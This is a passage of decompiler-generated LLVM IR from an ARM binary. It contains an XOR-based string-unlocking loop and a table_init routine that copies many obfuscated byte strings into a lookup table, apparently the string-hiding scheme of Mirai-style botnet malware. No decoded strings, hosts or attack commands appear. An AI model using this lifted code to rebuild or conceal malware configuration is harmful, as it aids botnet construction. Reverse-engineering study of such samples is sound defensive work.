  %v4_10500 = zext i16 %v3_10500 to i32
  %v0_10504 = load i32, i32* @ip, align 4
  %v1_10504 = add i32 %v0_10504, 1
  store i32 %v1_10504, i32* @ip, align 4
  %v8_1050c = icmp sgt i32 %v4_10500, %v1_10504
  br i1 %v8_1050c, label %dec_label_pc_104c0.dec_label_pc_104c0_crit_edge, label %dec_label_pc_10510.loopexit

dec_label_pc_104c0.dec_label_pc_104c0_crit_edge:  ; preds = %dec_label_pc_104c0
  %v0_104c8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_104c0

dec_label_pc_10510.loopexit:                      ; preds = %dec_label_pc_104c0
  %v2_10510.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10510

dec_label_pc_10510:                               ; preds = %dec_label_pc_10510.loopexit, %entry
  %v2_10510 = phi i32 [ %v2_10510.pre, %dec_label_pc_10510.loopexit ], [ %v3_104a4, %entry ]
  store i32 %v2_10510, i32* @r4, align 4
  ret i32 %v2_1048c

; uselistorder directives
  uselistorder i32 %v1_10504, { 1, 2, 0 }
  uselistorder i32 %v1_104b4, { 1, 0 }
  uselistorder i32 %v3_104a0, { 1, 0 }
  uselistorder i32 %v2_10490, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_10488, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10528 = mul i32 %arg1, 8
  %v2_1052c = add i32 %v3_10528, ptrtoint (i32* @global_var_24f3c.217 to i32)
  ret i32 %v2_1052c
}

define i32 @function_10544(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10544:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_10544 = load i32, i32* @r4, align 4
  store i32 %v3_10544, i32* %stack_var_-16, align 4
  %v1_10548 = urem i32 %arg3, 256
  store i32 %v1_10548, i32* %r6.global-to-local, align 4
  %v1_1054c = urem i32 %arg4, 256
  store i32 %v1_1054c, i32* %r5.global-to-local, align 4
  %v3_10550 = udiv i32 %arg2, 16777216
  store i32 %v3_10550, i32* %r4.global-to-local, align 4
  %v1_10554 = urem i32 %arg2, 256
  store i32 %v1_10554, i32* %lr.global-to-local, align 4
  %v0_10558 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10558, label %dec_label_pc_105b0, label %dec_label_pc_1055c

dec_label_pc_1055c:                               ; preds = %dec_label_pc_10544
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_105a0 = add i32 %tmp, 4
  %v2_105a0 = inttoptr i32 %v1_105a0 to i16*
  br label %dec_label_pc_10560

dec_label_pc_10560:                               ; preds = %dec_label_pc_10560.dec_label_pc_10560_crit_edge, %dec_label_pc_1055c
  %v0_10568 = phi i32 [ %v0_10568.pre, %dec_label_pc_10560.dec_label_pc_10560_crit_edge ], [ %v1_10554, %dec_label_pc_1055c ]
  %v2_1056c = phi i32 [ %v1_105a4, %dec_label_pc_10560.dec_label_pc_10560_crit_edge ], [ 0, %dec_label_pc_1055c ]
  %v2_10560 = load i32, i32* %arg1, align 4
  %v2_10564 = add i32 %v2_10560, %v2_1056c
  %v3_10564 = inttoptr i32 %v2_10564 to i8*
  %v4_10564 = load i8, i8* %v3_10564, align 1
  %v6_10564 = zext i8 %v4_10564 to i32
  %v2_10568 = xor i32 %v6_10564, %v0_10568
  %v1_1056c = trunc i32 %v2_10568 to i8
  store i8 %v1_1056c, i8* %v3_10564, align 1
  %v2_10570 = load i32, i32* %arg1, align 4
  %v0_10574 = load i32, i32* %ip.global-to-local, align 4
  %v2_10574 = add i32 %v0_10574, %v2_10570
  %v3_10574 = inttoptr i32 %v2_10574 to i8*
  %v4_10574 = load i8, i8* %v3_10574, align 1
  %v6_10574 = zext i8 %v4_10574 to i32
  %v0_10578 = load i32, i32* %r6.global-to-local, align 4
  %v2_10578 = xor i32 %v0_10578, %v6_10574
  %v1_1057c = trunc i32 %v2_10578 to i8
  store i8 %v1_1057c, i8* %v3_10574, align 1
  %v2_10580 = load i32, i32* %arg1, align 4
  %v0_10584 = load i32, i32* %ip.global-to-local, align 4
  %v2_10584 = add i32 %v0_10584, %v2_10580
  %v3_10584 = inttoptr i32 %v2_10584 to i8*
  %v4_10584 = load i8, i8* %v3_10584, align 1
  %v6_10584 = zext i8 %v4_10584 to i32
  %v0_10588 = load i32, i32* %r5.global-to-local, align 4
  %v2_10588 = xor i32 %v0_10588, %v6_10584
  %v1_1058c = trunc i32 %v2_10588 to i8
  store i8 %v1_1058c, i8* %v3_10584, align 1
  %v2_10590 = load i32, i32* %arg1, align 4
  %v0_10594 = load i32, i32* %ip.global-to-local, align 4
  %v2_10594 = add i32 %v0_10594, %v2_10590
  %v3_10594 = inttoptr i32 %v2_10594 to i8*
  %v4_10594 = load i8, i8* %v3_10594, align 1
  %v6_10594 = zext i8 %v4_10594 to i32
  %v0_10598 = load i32, i32* %r4.global-to-local, align 4
  %v2_10598 = xor i32 %v0_10598, %v6_10594
  %v1_1059c = trunc i32 %v2_10598 to i8
  store i8 %v1_1059c, i8* %v3_10594, align 1
  %v3_105a0 = load i16, i16* %v2_105a0, align 2
  %v4_105a0 = zext i16 %v3_105a0 to i32
  %v0_105a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_105a4 = add i32 %v0_105a4, 1
  store i32 %v1_105a4, i32* %ip.global-to-local, align 4
  %v8_105ac = icmp sgt i32 %v4_105a0, %v1_105a4
  br i1 %v8_105ac, label %dec_label_pc_10560.dec_label_pc_10560_crit_edge, label %dec_label_pc_105b0.loopexit

dec_label_pc_10560.dec_label_pc_10560_crit_edge:  ; preds = %dec_label_pc_10560
  %v0_10568.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10560

dec_label_pc_105b0.loopexit:                      ; preds = %dec_label_pc_10560
  %v2_105b0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_105b0

dec_label_pc_105b0:                               ; preds = %dec_label_pc_105b0.loopexit, %dec_label_pc_10544
  %v2_105b0 = phi i32 [ %v2_105b0.pre, %dec_label_pc_105b0.loopexit ], [ %v3_10544, %dec_label_pc_10544 ]
  store i32 %v2_105b0, i32* %r4.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_105a4, { 1, 2, 0 }
  uselistorder i32 %v1_10554, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_105c0 = load i32, i32* @r4, align 4
  %v6_105c0 = load i32, i32* @r5, align 4
  %v9_105c0 = load i32, i32* @r6, align 4
  %v12_105c0 = load i32, i32* @r7, align 4
  %v15_105c0 = load i32, i32* @r8, align 4
  %v21_105c0 = load i32, i32* @sl, align 4
  %v24_105c0 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_105cc = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24f3c.217 to i32), i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  store i32 %v0_105cc, i32* @r5, align 4
  %v3_105e4 = call i32 @util_memcpy(i32 %v0_105cc, i32 ptrtoint (i32* @global_var_19b04.225 to i32), i32 2)
  store i32 10, i32* @r0, align 4
  store i32 10, i32* @fp, align 4
  %v0_105f0 = load i32, i32* @r5, align 4
  store i32 %v0_105f0, i32* @global_var_24f44.226, align 4
  %v0_105f4 = load i32, i32* @r6, align 4
  %v1_105f4 = trunc i32 %v0_105f4 to i16
  store i16 %v1_105f4, i16* bitcast (i32* @global_var_24f48.227 to i16*), align 4
  %v0_105f8 = call i32 @malloc()
  store i32 ptrtoint ([11 x i8]* @global_var_19b08.229 to i32), i32* @r7, align 4
  %v0_10600 = load i32, i32* @fp, align 4
  store i32 %v0_105f8, i32* @r5, align 4
  %v4_1060c = call i32 @util_memcpy(i32 %v0_105f8, i32 ptrtoint ([11 x i8]* @global_var_19b08.229 to i32), i32 %v0_10600)
  %v0_10610 = load i32, i32* @fp, align 4
  store i32 %v0_10610, i32* @r0, align 4
  %v0_10614 = load i32, i32* @r5, align 4
  store i32 %v0_10614, i32* @global_var_24f4c.230, align 4
  %v1_10618 = trunc i32 %v0_10610 to i16
  store i16 %v1_10618, i16* bitcast (i32* @global_var_24f50.231 to i16*), align 4
  %v0_1061c = call i32 @malloc()
  %v0_10620 = load i32, i32* @r7, align 4
  %v0_10624 = load i32, i32* @fp, align 4
  store i32 %v0_1061c, i32* @r5, align 4
  %v4_1062c = call i32 @util_memcpy(i32 %v0_1061c, i32 %v0_10620, i32 %v0_10624)
  %v0_10630 = load i32, i32* @r6, align 4
  store i32 %v0_10630, i32* @r0, align 4
  %v0_10634 = load i32, i32* @r5, align 4
  store i32 %v0_10634, i32* @global_var_24f54.232, align 4
  %v0_10638 = load i32, i32* @fp, align 4
  %v1_10638 = trunc i32 %v0_10638 to i16
  store i16 %v1_10638, i16* bitcast (i32* @global_var_24f58.233 to i16*), align 4
  %v0_1063c = call i32 @malloc()
  %v0_10640 = load i32, i32* @r6, align 4
  store i32 %v0_1063c, i32* @r5, align 4
  %v3_1064c = call i32 @util_memcpy(i32 %v0_1063c, i32 ptrtoint (i32* @global_var_19b14.235 to i32), i32 %v0_10640)
  store i32 36, i32* @r0, align 4
  %v0_10654 = load i32, i32* @r5, align 4
  store i32 %v0_10654, i32* @global_var_24f5c.236, align 4
  %v0_10658 = load i32, i32* @r6, align 4
  %v1_10658 = trunc i32 %v0_10658 to i16
  store i16 %v1_10658, i16* bitcast (i32* @global_var_24f60.237 to i16*), align 4
  %v0_1065c = call i32 @malloc()
  store i32 %v0_1065c, i32* @r5, align 4
  %v4_1066c = call i32 @util_memcpy(i32 %v0_1065c, i32 ptrtoint ([37 x i8]* @global_var_19b18.239 to i32), i32 36)
  store i32 6, i32* @r0, align 4
  %v0_10678 = load i32, i32* @r5, align 4
  store i32 %v0_10678, i32* @global_var_24f64.240, align 4
  store i16 36, i16* bitcast (i32* @global_var_24f68.241 to i16*), align 4
  %v0_10680 = call i32 @malloc()
  store i32 %v0_10680, i32* @r5, align 4
  %v4_10690 = call i32 @util_memcpy(i32 %v0_10680, i32 ptrtoint ([7 x i8]* @global_var_19b40.243 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r6, align 4
  store i16 6, i16* bitcast (i32* @global_var_24f70.244 to i16*), align 4
  %v0_106a4 = load i32, i32* @r5, align 4
  store i32 %v0_106a4, i32* @global_var_24f6c.245, align 4
  %v0_106a8 = call i32 @malloc()
  %v0_106ac = load i32, i32* @r6, align 4
  store i32 %v0_106a8, i32* @r5, align 4
  %v4_106b8 = call i32 @util_memcpy(i32 %v0_106a8, i32 ptrtoint ([8 x i8]* @global_var_19b48.247 to i32), i32 %v0_106ac)
  %v0_106bc = load i32, i32* @r6, align 4
  store i32 %v0_106bc, i32* @r0, align 4
  %v0_106c0 = load i32, i32* @r5, align 4
  store i32 %v0_106c0, i32* @global_var_24f74.248, align 4
  %v1_106c4 = trunc i32 %v0_106bc to i16
  store i16 %v1_106c4, i16* bitcast (i32* @global_var_24f78.249 to i16*), align 4
  %v0_106c8 = call i32 @malloc()
  %v0_106cc = load i32, i32* @r6, align 4
  store i32 %v0_106c8, i32* @r5, align 4
  %v4_106d8 = call i32 @util_memcpy(i32 %v0_106c8, i32 ptrtoint ([8 x i8]* @global_var_19b50.251 to i32), i32 %v0_106cc)
  store i32 3, i32* @r0, align 4
  %v0_106e0 = load i32, i32* @r5, align 4
  store i32 %v0_106e0, i32* @global_var_24f7c.252, align 4
  %v0_106e4 = load i32, i32* @r6, align 4
  %v1_106e4 = trunc i32 %v0_106e4 to i16
  store i16 %v1_106e4, i16* bitcast (i32* @global_var_24f80.253 to i16*), align 4
  %v0_106e8 = call i32 @malloc()
  store i32 %v0_106e8, i32* @r5, align 4
  %v4_106f8 = call i32 @util_memcpy(i32 %v0_106e8, i32 ptrtoint ([4 x i8]* @global_var_19b58.255 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  %v0_10704 = load i32, i32* @r5, align 4
  store i32 %v0_10704, i32* @global_var_24f84.256, align 4
  store i16 3, i16* bitcast (i32* @global_var_24f88.257 to i16*), align 4
  %v0_1070c = call i32 @malloc()
  store i32 19, i32* @sl, align 4
  store i32 %v0_1070c, i32* @r5, align 4
  %v3_10720 = call i32 @util_memcpy(i32 %v0_1070c, i32 ptrtoint (i32* @global_var_19b5c.259 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_10728 = load i32, i32* @r5, align 4
  store i32 %v0_10728, i32* @global_var_24f8c.260, align 4
  %v0_1072c = load i32, i32* @sl, align 4
  %v1_1072c = trunc i32 %v0_1072c to i16
  store i16 %v1_1072c, i16* bitcast (i32* @global_var_24f90.261 to i16*), align 4
  %v0_10730 = call i32 @malloc()
  store i32 %v0_10730, i32* @r5, align 4
  %v3_10740 = call i32 @util_memcpy(i32 %v0_10730, i32 ptrtoint (i32* @global_var_19b70.263 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_24f98.264 to i16*), align 4
  %v0_10750 = load i32, i32* @r5, align 4
  store i32 %v0_10750, i32* @global_var_24f94.265, align 4
  %v0_10754 = call i32 @malloc()
  store i32 %v0_10754, i32* @r5, align 4
  %v4_10764 = call i32 @util_memcpy(i32 %v0_10754, i32 ptrtoint ([10 x i8]* @global_var_19b8c.267 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_10770 = load i32, i32* @r5, align 4
  store i32 %v0_10770, i32* @global_var_24f9c.268, align 4
  store i16 9, i16* bitcast (i32* @global_var_24fa0.269 to i16*), align 4
  %v0_10778 = call i32 @malloc()
  store i32 16, i32* @sb, align 4
  store i32 %v0_10778, i32* @r5, align 4
  %v4_1078c = call i32 @util_memcpy(i32 %v0_10778, i32 ptrtoint ([17 x i8]* @global_var_19b98.271 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_10794 = load i32, i32* @r5, align 4
  store i32 %v0_10794, i32* @global_var_24fa4.272, align 4
  %v0_10798 = load i32, i32* @sb, align 4
  %v1_10798 = trunc i32 %v0_10798 to i16
  store i16 %v1_10798, i16* bitcast (i32* @global_var_24fa8.273 to i16*), align 4
  %v0_1079c = call i32 @malloc()
  store i32 %v0_1079c, i32* @r5, align 4
  %v4_107ac = call i32 @util_memcpy(i32 %v0_1079c, i32 ptrtoint ([23 x i8]* @global_var_19bac.275 to i32), i32 22)
  %v0_107b4 = load i32, i32* @r6, align 4
  store i32 %v0_107b4, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_24fb0.276 to i16*), align 4
  %v0_107bc = load i32, i32* @r5, align 4
  store i32 %v0_107bc, i32* @global_var_24fac.277, align 4
  %v0_107c0 = call i32 @malloc()
  %v0_107c4 = load i32, i32* @r6, align 4
  store i32 %v0_107c0, i32* @r5, align 4
  %v4_107d0 = call i32 @util_memcpy(i32 %v0_107c0, i32 ptrtoint ([8 x i8]* @global_var_19bc4.279 to i32), i32 %v0_107c4)
  store i32 5, i32* @r0, align 4
  %v0_107d8 = load i32, i32* @r5, align 4
  store i32 %v0_107d8, i32* @global_var_24fb4.280, align 4
  %v0_107dc = load i32, i32* @r6, align 4
  %v1_107dc = trunc i32 %v0_107dc to i16
  store i16 %v1_107dc, i16* bitcast (i32* @global_var_24fb8.281 to i16*), align 4
  %v0_107e0 = call i32 @malloc()
  store i32 %v0_107e0, i32* @r5, align 4
  %v4_107f0 = call i32 @util_memcpy(i32 %v0_107e0, i32 ptrtoint ([6 x i8]* @global_var_19bcc.283 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_107fc = load i32, i32* @r5, align 4
  store i32 %v0_107fc, i32* @global_var_24fbc.284, align 4
  store i16 5, i16* bitcast (i32* @global_var_24fc0.285 to i16*), align 4
  %v0_10804 = call i32 @malloc()
  store i32 %v0_10804, i32* @r5, align 4
  %v4_10814 = call i32 @util_memcpy(i32 %v0_10804, i32 ptrtoint ([5 x i8]* @global_var_19bd4.287 to i32), i32 4)
  store i32 6, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_24fc8.288 to i16*), align 4
  %v0_10824 = load i32, i32* @r5, align 4
  store i32 %v0_10824, i32* @global_var_24fc4.289, align 4
  %v0_10828 = call i32 @malloc()
  store i32 %v0_10828, i32* @r5, align 4
  %v4_10838 = call i32 @util_memcpy(i32 %v0_10828, i32 ptrtoint ([7 x i8]* @global_var_19bdc.291 to i32), i32 6)
  store i32 14, i32* @r0, align 4
  %v0_10844 = load i32, i32* @r5, align 4
  store i32 %v0_10844, i32* @global_var_24fcc.292, align 4
  store i16 6, i16* bitcast (i32* @global_var_24fd0.293 to i16*), align 4
  %v0_1084c = call i32 @malloc()
  store i32 14, i32* @r7, align 4
  store i32 %v0_1084c, i32* @r5, align 4
  %v4_10860 = call i32 @util_memcpy(i32 %v0_1084c, i32 ptrtoint ([15 x i8]* @global_var_19be4.295 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_10868 = load i32, i32* @r5, align 4
  store i32 %v0_10868, i32* @global_var_24fd4.296, align 4
  %v0_1086c = load i32, i32* @r7, align 4
  %v1_1086c = trunc i32 %v0_1086c to i16
  store i16 %v1_1086c, i16* bitcast (i32* @global_var_24fd8.297 to i16*), align 4
  %v0_10870 = call i32 @malloc()
  store i32 8, i32* @r8, align 4
  store i32 %v0_10870, i32* @r5, align 4
  %v4_10884 = call i32 @util_memcpy(i32 %v0_10870, i32 ptrtoint ([9 x i8]* @global_var_19bf4.299 to i32), i32 8)
  %v0_1088c = load i32, i32* @r6, align 4
  store i32 %v0_1088c, i32* @r0, align 4
  %v0_10890 = load i32, i32* @r8, align 4
  %v1_10890 = trunc i32 %v0_10890 to i16
  %v2_10890 = load i32, i32* @r4, align 4
  %v4_10890 = add i32 %v2_10890, 276
  %v5_10890 = inttoptr i32 %v4_10890 to i16*
  store i16 %v1_10890, i16* %v5_10890, align 2
  %v0_10894 = load i32, i32* @r5, align 4
  store i32 %v0_10894, i32* @global_var_2504c.300, align 4
  %v0_10898 = call i32 @malloc()
  %v0_1089c = load i32, i32* @r6, align 4
  store i32 %v0_10898, i32* @r5, align 4
  %v4_108a8 = call i32 @util_memcpy(i32 %v0_10898, i32 ptrtoint ([8 x i8]* @global_var_19c00.302 to i32), i32 %v0_1089c)
  %v0_108b0 = load i32, i32* @sb, align 4
  store i32 %v0_108b0, i32* @r0, align 4
  %v0_108b4 = load i32, i32* @r6, align 4
  %v1_108b4 = trunc i32 %v0_108b4 to i16
  %v2_108b4 = load i32, i32* @r4, align 4
  %v4_108b4 = add i32 %v2_108b4, 284
  %v5_108b4 = inttoptr i32 %v4_108b4 to i16*
  store i16 %v1_108b4, i16* %v5_108b4, align 2
  %v0_108b8 = load i32, i32* @r5, align 4
  store i32 %v0_108b8, i32* @global_var_25054.303, align 4
  %v0_108bc = call i32 @malloc()
  %v0_108c0 = load i32, i32* @sb, align 4
  store i32 %v0_108bc, i32* @r5, align 4
  %v4_108cc = call i32 @util_memcpy(i32 %v0_108bc, i32 ptrtoint ([17 x i8]* @global_var_19c08.305 to i32), i32 %v0_108c0)
  store i32 23, i32* @r0, align 4
  %v0_108d4 = load i32, i32* @r5, align 4
  store i32 %v0_108d4, i32* @global_var_24fdc.306, align 4
  %v0_108d8 = load i32, i32* @sb, align 4
  %v1_108d8 = trunc i32 %v0_108d8 to i16
  store i16 %v1_108d8, i16* bitcast (i32* @global_var_24fe0.307 to i16*), align 4
  %v0_108dc = call i32 @malloc()
  %v0_108e8 = load i32, i32* @r6, align 4
  %v1_108e8 = load i32, i32* @sb, align 4
  %v2_108e8 = add i32 %v1_108e8, %v0_108e8
  store i32 %v2_108e8, i32* @r6, align 4
  store i32 %v0_108dc, i32* @r5, align 4
  %v4_108f0 = call i32 @util_memcpy(i32 %v0_108dc, i32 ptrtoint ([24 x i8]* @global_var_19c1c.309 to i32), i32 23)
  %v0_108f4 = load i32, i32* @r8, align 4
  store i32 %v0_108f4, i32* @r0, align 4
  %v0_108f8 = load i32, i32* @r5, align 4
  store i32 %v0_108f8, i32* @global_var_24fe4.310, align 4
  %v0_108fc = load i32, i32* @r6, align 4
  %v1_108fc = trunc i32 %v0_108fc to i16
  store i16 %v1_108fc, i16* bitcast (i32* @global_var_24fe8.311 to i16*), align 4
  %v0_10900 = call i32 @malloc()
  %v0_10908 = load i32, i32* @r8, align 4
  store i32 %v0_10900, i32* @r5, align 4
  %v4_10910 = call i32 @util_memcpy(i32 %v0_10900, i32 ptrtoint ([9 x i8]* @global_var_19c34.313 to i32), i32 %v0_10908)
  %v0_10914 = load i32, i32* @r7, align 4
  store i32 %v0_10914, i32* @r0, align 4
  %v0_10918 = load i32, i32* @r5, align 4
  store i32 %v0_10918, i32* @global_var_24fec.314, align 4
  %v0_1091c = load i32, i32* @r8, align 4
  %v1_1091c = trunc i32 %v0_1091c to i16
  store i16 %v1_1091c, i16* bitcast (i32* @global_var_24ff0.315 to i16*), align 4
  %v0_10920 = call i32 @malloc()
  %v0_10928 = load i32, i32* @r7, align 4
  store i32 %v0_10920, i32* @r5, align 4
  %v4_10930 = call i32 @util_memcpy(i32 %v0_10920, i32 ptrtoint ([15 x i8]* @global_var_19c40.317 to i32), i32 %v0_10928)
  %v0_10934 = load i32, i32* @sl, align 4
  store i32 %v0_10934, i32* @r0, align 4
  %v0_10938 = load i32, i32* @r5, align 4
  store i32 %v0_10938, i32* @global_var_24ff4.318, align 4
  %v0_1093c = load i32, i32* @r7, align 4
  %v1_1093c = trunc i32 %v0_1093c to i16
  store i16 %v1_1093c, i16* bitcast (i32* @global_var_24ff8.319 to i16*), align 4
  %v0_10940 = call i32 @malloc()
  store i32 ptrtoint ([20 x i8]* @global_var_19c50.321 to i32), i32* @sb, align 4
  %v0_10948 = load i32, i32* @sl, align 4
  store i32 %v0_10940, i32* @r5, align 4
  %v4_10954 = call i32 @util_memcpy(i32 %v0_10940, i32 ptrtoint ([20 x i8]* @global_var_19c50.321 to i32), i32 %v0_10948)
  %v0_10958 = load i32, i32* @fp, align 4
  store i32 %v0_10958, i32* @r0, align 4
  %v0_1095c = load i32, i32* @r5, align 4
  store i32 %v0_1095c, i32* @global_var_24ffc.322, align 4
  %v0_10960 = load i32, i32* @sl, align 4
  %v1_10960 = trunc i32 %v0_10960 to i16
  store i16 %v1_10960, i16* bitcast (i32* @global_var_25000.323 to i16*), align 4
  %v0_10964 = call i32 @malloc()
  %v0_1096c = load i32, i32* @fp, align 4
  store i32 %v0_10964, i32* @r5, align 4
  %v4_10974 = call i32 @util_memcpy(i32 %v0_10964, i32 ptrtoint ([11 x i8]* @global_var_19c64.325 to i32), i32 %v0_1096c)
  store i32 21, i32* @r0, align 4
  %v0_10980 = load i32, i32* @fp, align 4
  %v1_10980 = trunc i32 %v0_10980 to i16
  %v2_10980 = load i32, i32* @r4, align 4
  %v4_10980 = add i32 %v2_10980, 292
  %v5_10980 = inttoptr i32 %v4_10980 to i16*
  store i16 %v1_10980, i16* %v5_10980, align 2
  %v0_10984 = load i32, i32* @r5, align 4
  store i32 %v0_10984, i32* @global_var_2505c.326, align 4
  %v0_10988 = call i32 @malloc()
  store i32 %v0_10988, i32* @r5, align 4
  %v3_10998 = call i32 @util_memcpy(i32 %v0_10988, i32 ptrtoint (i32* @global_var_19cc8.328 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_25008.329 to i16*), align 4
  %v0_109a8 = load i32, i32* @r5, align 4
  store i32 %v0_109a8, i32* @global_var_25004.330, align 4
  %v0_109ac = call i32 @malloc()
  store i32 %v0_109ac, i32* @r5, align 4
  %v4_109bc = call i32 @util_memcpy(i32 %v0_109ac, i32 ptrtoint ([18 x i8]* @global_var_19c70.332 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  %v0_109c8 = load i32, i32* @r5, align 4
  store i32 %v0_109c8, i32* @global_var_2500c.333, align 4
  store i16 17, i16* bitcast (i32* @global_var_25010.334 to i16*), align 4
  %v0_109d0 = call i32 @malloc()
  store i32 %v0_109d0, i32* @r5, align 4
  %v4_109e0 = call i32 @util_memcpy(i32 %v0_109d0, i32 ptrtoint ([13 x i8]* @global_var_19c84.336 to i32), i32 12)
  %v0_109e8 = load i32, i32* @r7, align 4
  store i32 %v0_109e8, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_25018.337 to i16*), align 4
  %v0_109f0 = load i32, i32* @r5, align 4
  store i32 %v0_109f0, i32* @global_var_25014.338, align 4
  %v0_109f4 = call i32 @malloc()
  %v0_109fc = load i32, i32* @r7, align 4
  store i32 %v0_109f4, i32* @r5, align 4
  %v4_10a04 = call i32 @util_memcpy(i32 %v0_109f4, i32 ptrtoint ([15 x i8]* @global_var_19c40.317 to i32), i32 %v0_109fc)
  %v0_10a08 = load i32, i32* @sl, align 4
  store i32 %v0_10a08, i32* @r0, align 4
  %v0_10a0c = load i32, i32* @r5, align 4
  store i32 %v0_10a0c, i32* @global_var_2501c.339, align 4
  %v0_10a10 = load i32, i32* @r7, align 4
  %v1_10a10 = trunc i32 %v0_10a10 to i16
  store i16 %v1_10a10, i16* bitcast (i32* @global_var_25020.340 to i16*), align 4
  %v0_10a14 = call i32 @malloc()
  %v0_10a18 = load i32, i32* @sb, align 4
  %v0_10a1c = load i32, i32* @sl, align 4
  store i32 %v0_10a14, i32* @r5, align 4
  %v4_10a24 = call i32 @util_memcpy(i32 %v0_10a14, i32 %v0_10a18, i32 %v0_10a1c)
  %v0_10a28 = load i32, i32* @r8, align 4
  store i32 %v0_10a28, i32* @r0, align 4
  %v0_10a2c = load i32, i32* @r5, align 4
  store i32 %v0_10a2c, i32* @global_var_25024.341, align 4
  %v0_10a30 = load i32, i32* @sl, align 4
  %v1_10a30 = trunc i32 %v0_10a30 to i16
  store i16 %v1_10a30, i16* bitcast (i32* @global_var_25028.342 to i16*), align 4
  %v0_10a34 = call i32 @malloc()
  %v0_10a3c = load i32, i32* @r8, align 4
  store i32 %v0_10a34, i32* @r5, align 4
  %v4_10a44 = call i32 @util_memcpy(i32 %v0_10a34, i32 ptrtoint ([9 x i8]* @global_var_19c94.344 to i32), i32 %v0_10a3c)
  store i32 5, i32* @r0, align 4
  %v0_10a4c = load i32, i32* @r5, align 4
  store i32 %v0_10a4c, i32* @global_var_2502c.345, align 4
  %v0_10a50 = load i32, i32* @r8, align 4
  %v1_10a50 = trunc i32 %v0_10a50 to i16
  store i16 %v1_10a50, i16* bitcast (i32* @global_var_25030.346 to i16*), align 4
  %v0_10a54 = call i32 @malloc()
  store i32 %v0_10a54, i32* @r5, align 4
  %v4_10a64 = call i32 @util_memcpy(i32 %v0_10a54, i32 ptrtoint ([6 x i8]* @global_var_19ca0.348 to i32), i32 5)
  store i32 6, i32* @r0, align 4
  %v0_10a70 = load i32, i32* @r5, align 4
  store i32 %v0_10a70, i32* @global_var_25034.349, align 4
  store i16 5, i16* bitcast (i32* @global_var_25038.350 to i16*), align 4
  %v0_10a78 = call i32 @malloc()
  store i32 %v0_10a78, i32* @r5, align 4
  %v4_10a88 = call i32 @util_memcpy(i32 %v0_10a78, i32 ptrtoint ([7 x i8]* @global_var_19ca8.352 to i32), i32 6)
  %v0_10a94 = load i32, i32* @r6, align 4
  store i32 %v0_10a94, i32* @r0, align 4
  %v2_10a98 = load i32, i32* @r4, align 4
  %v4_10a98 = add i32 %v2_10a98, 260
  %v5_10a98 = inttoptr i32 %v4_10a98 to i16*
  store i16 6, i16* %v5_10a98, align 2
  %v0_10a9c = load i32, i32* @r5, align 4
  store i32 %v0_10a9c, i32* @global_var_2503c.353, align 4
  %v0_10aa0 = call i32 @malloc()
  %v0_10aa8 = load i32, i32* @r6, align 4
  store i32 %v0_10aa0, i32* %r5.global-to-local, align 4
  %v4_10ab0 = call i32 @util_memcpy(i32 %v0_10aa0, i32 ptrtoint ([24 x i8]* @global_var_19cb0.355 to i32), i32 %v0_10aa8)
  %v0_10ab8 = load i32, i32* @r6, align 4
  %v1_10ab8 = trunc i32 %v0_10ab8 to i16
  %v2_10ab8 = load i32, i32* @r4, align 4
  %v4_10ab8 = add i32 %v2_10ab8, 268
  %v5_10ab8 = inttoptr i32 %v4_10ab8 to i16*
  store i16 %v1_10ab8, i16* %v5_10ab8, align 2
  %v0_10abc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10abc, i32* @global_var_25044.356, align 4
  store i32 %v3_105c0, i32* @r4, align 4
  store i32 %v6_105c0, i32* @r5, align 4
  store i32 %v9_105c0, i32* @r6, align 4
  store i32 %v12_105c0, i32* @r7, align 4
  store i32 %v15_105c0, i32* @r8, align 4
  store i32 %v21_105c0, i32* @sl, align 4
  store i32 %v24_105c0, i32* @fp, align 4
  ret i32 %v4_10ab0

; uselistorder directives
  uselistorder i32 %v0_10aa0, { 1, 0 }
  uselistorder i32 %v0_10a34, { 1, 0 }
  uselistorder i32 %v0_10a14, { 1, 0 }
  uselistorder i32 %v0_109f4, { 1, 0 }
  uselistorder i32 %v0_10964, { 1, 0 }
  uselistorder i32 %v0_10940, { 1, 0 }
  uselistorder i32 %v0_10920, { 1, 0 }
  uselistorder i32 %v0_10900, { 1, 0 }
  uselistorder i32 %v0_108dc, { 1, 0 }
